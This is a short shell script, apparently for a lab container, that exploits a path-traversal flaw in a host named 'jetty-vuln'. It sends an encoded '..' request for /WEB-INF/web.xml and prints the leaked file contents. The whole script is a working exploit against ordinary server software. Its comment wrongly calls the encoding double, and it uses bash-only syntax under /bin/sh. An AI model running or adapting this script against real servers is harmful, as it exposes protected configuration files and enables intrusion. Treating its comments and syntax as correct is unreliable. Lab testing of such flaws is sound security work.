#!/bin/sh

echo "Starting exploit against vulnerable Jetty instance..."

# Wait until Jetty is listening on port 8080
MAX_WAIT=60
WAITED=0
while true; do
  if curl -s -o /dev/null http://jetty-vuln:8080/; then
    echo "Jetty is up after $WAITED seconds."
    break
  fi
  sleep 2
  WAITED=$((WAITED + 2))
  if [ $WAITED -ge $MAX_WAIT ]; then
    echo "Jetty did not become ready within $MAX_WAIT seconds. Exiting."
    exit 1
  fi
done

# Crafted request that uses a double‑encoded ".." to bypass Jetty's canonicalisation
TARGET_URL="http://jetty-vuln:8080/%2e%2e/WEB-INF/web.xml"

echo "Sending request to $TARGET_URL"

# Perform the request and display HTTP status and response body (if any)
response=$(curl -s -w "%{http_code}" "$TARGET_URL")
status=${response: -3}
body=${response%???}

echo "HTTP status: $status"
if [ "$status" = "200" ]; then
  echo "--- Begin leaked file content ---"
  echo "$body"
  echo "--- End leaked file content ---"
else
  echo "Exploit did not succeed (non‑200 response)."
fi

# Keep the container alive for a short period so logs can be inspected
sleep 30